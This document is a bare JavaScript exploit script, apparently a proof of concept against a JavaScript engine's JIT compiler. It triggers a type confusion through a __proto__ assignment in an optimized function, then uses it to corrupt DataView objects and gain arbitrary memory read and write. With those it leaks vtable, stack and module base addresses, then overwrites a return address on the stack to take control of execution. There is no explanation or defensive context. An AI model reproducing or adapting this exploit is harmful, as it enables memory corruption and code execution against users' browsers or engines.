let obj = {};
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;
dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

function opt(o, proto, value) {
  o.b = 1;
  let tmp = {
    __proto__: proto
  };
  o.a = value;
}

function read64(addrLo, addrHi) {
  dv1.setUint32(0x38, addrLo, true);
  dv1.setUint32(0x3C, addrHi, true);
  var readVal = new Uint32Array(0x10);
  readVal[0] = dv2.getUint32(0x0, true);
  readVal[1] = dv2.getUint32(0x4, true);
  return readVal;
}

function write64(addrLo, addrHi, lo, hi) {
  dv1.setUint32(0x38, addrLo, true);
  dv1.setUint32(0x3C, addrHi, true);
  dv2.setUint32(0x0, lo, true);
  dv2.setUint32(0x4, hi, true);
}

function hex(i) {
  return i.toString(16);
}

function main() {
  for (let i = 0; i < 2000; i++) {
    let o = {
      a: 1,
      b: 2
    };
    opt(o, {}, {});
  }

  let o = {
    a: 1,
    b: 2
  };
  opt(o, o, obj);
  o.c = dv1;
  obj.h = dv2;
  vtableLo = dv1.getUint32(0x0, true);
  vtableHi = dv1.getUint32(0x4, true);
  typeLo = dv1.getUint32(0x8, true);
  typeHi = dv1.getUint32(0xC, true);
  var jslAddr = read64(typeLo + 0x08, typeHi);
  var scAddr = read64(jslAddr[0] + 0x450, jslAddr[1]);
  var tcAddr = read64(scAddr[0] + 0x3b8, scAddr[1]);
  var stackLeak = read64(tcAddr[0] + 0xc8, tcAddr[1]);
  var stackLimitLo = stackLeak[0] + 0xed000;
  var stackLimitHi = stackLeak[1];
  var v8BaseLo = vtableLo - 0x019ceda8;
  var v8BaseHi = vtableHi;
  print("Leaked vtable: " + hex(vtableHi) + "`" + hex(vtableLo));
  print("Leaked type pointer: " + hex(typeHi) + "`" + hex(typeLo));
  print("JSL: " + hex(jslAddr[1]) + "`" + hex(jslAddr[0]));
  print("tcAddr: " + hex(tcAddr[1]) + "`" + hex(tcAddr[0]));
  print("stackLeak: " + hex(stackLeak[1]) + "`" + hex(stackLeak[0]));
  print("Stack Limit: " + hex(stackLimitHi) + "`" + hex(stackLimitLo));
  print("V8 base: " + hex(v8BaseHi) + "`" + hex(v8BaseLo));
  var retAddrLo = v8BaseLo + 0x1768f20;
  var retAddrHi = v8BaseHi;
  print("retAddr: " + hex(retAddrHi) + "`" + hex(retAddrLo));
  var counter = 0;

  while (true) {
    var tempAddr = read64(stackLimitLo + counter, stackLimitHi);

    if (tempAddr[0] == retAddrLo && tempAddr[1] == retAddrHi) {
      print("Replaced address!");
      write64(stackLimitLo + counter, stackLimitHi, 0x41414141, 0x41414141);
      break;
    } else {
      counter = counter + 0x8;
    }
  }
}

main();